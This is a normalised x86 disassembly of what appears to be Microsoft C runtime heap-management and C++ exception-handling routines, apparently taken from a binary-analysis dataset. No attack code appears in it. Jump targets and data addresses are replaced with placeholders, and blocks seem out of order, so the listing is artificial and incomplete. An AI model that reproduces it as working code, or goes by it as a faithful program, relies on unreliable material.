mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edi - 0x20 ]
mov edi 0x80000000
shr edi cl
lea eax [ eax + esi * 4 + 0xc4 ]
or [ eax ] edi
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edi
shr ebx cl
lea eax [ eax + esi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
mov ebx [ ebp - 0xc ]
add ecx 0xffffffe0
mov edx 0x80000000
shr edx cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0xc4 ] edx
dec [ ecx ]
jne r-xdata
mov edx 0x80000000
shr edx cl
lea ecx [ ecx + eax + 0x4 ]
not edx
and [ eax + esi * 4 + 0x44 ] edx
dec [ ecx ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call edi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_40d490
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
and [ ecx ] edx
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x14
mov [ rw-data ] eax
mov [ rw-data ] esi
sub_40ec48
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_40f002
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40ef51
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40ef51
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_40f002
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_40f0fd
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_40f3f3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_40fd8b
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40f48e
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_40f748
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_40f48e
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_40fd8b
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_40fd2a
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40f641
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_40fcc3
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_40bed8
add esp 0x14
mov ebx eax
call sub_40fcc3
mov esi [ eax + 0x6c ]
call sub_40fcc3
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_413c90
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_40fd8b
push 0x1
push esi
call sub_40fb80
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_40f6eb
add esp 0xc
test eax eax
jne r-xdata
call sub_40fd8b
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40f7fc
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_40f641
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_40fcc3
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_40bed8
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bdad
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f7fc
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_40f6eb
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_4125e0
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_40f748
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_40fd8b
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_40fc10
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40f7fc
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_40f9bc
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_40bc6d
call sub_40bcaf
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_40f748
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40f877
add esp 0x2c
test eax eax
je r-xdata
sub_40f877
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_40fcc3
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_40fcc3
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_40fcc3
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_40fcc3
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
